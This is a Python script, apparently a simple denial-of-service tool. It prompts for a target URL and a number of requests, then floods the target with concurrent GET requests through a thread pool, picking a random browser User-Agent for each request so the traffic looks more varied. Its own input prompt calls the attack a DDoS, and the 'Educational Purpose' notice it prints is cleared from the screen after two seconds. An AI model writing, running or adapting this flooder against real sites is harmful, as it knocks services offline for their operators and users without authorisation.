import requests
import random
import os
import time
from concurrent.futures import ThreadPoolExecutor
import threading

success_counter = 0
counter_lock = threading.Lock()

def startup():
    print("This tool is only for Educational Purpose.")
    print("\n")
    clear_screen()


def clear_screen():
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')


def send_request(url):
    global success_counter
    
    try:
        user_agents = [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
            "SamsungBrowser/17.0 (Galaxy S23 Ultra; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
        ]
        
        user_agent = random.choice(user_agents)
        
        headers = {"User-Agent": user_agent}
        
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            with counter_lock:
                success_counter += 1
            print(f"{success_counter} =>Request to {url} with User-Agent {user_agent} successful")

        else:
            print(f"Request to {url} with User-Agent {user_agent} failed with status code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while sending request to {url}: {e}")

def main():
    startup()
    
    try:
        
        url = input("Enter target URL: ")
        
        num_requests = int(input("Enter number of requests to perform DDoS: "))
      
        max_workers = int(input("Enter number of workers: "))
        
        # Create a ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit requests
            for _ in range(num_requests):
                executor.submit(send_request, url)
        
        print(f"Total successful requests: {success_counter}")
    
    except ValueError:
        print("Invalid input. Please enter a valid number for number of requests and workers.")

if __name__ == "__main__":
    main()
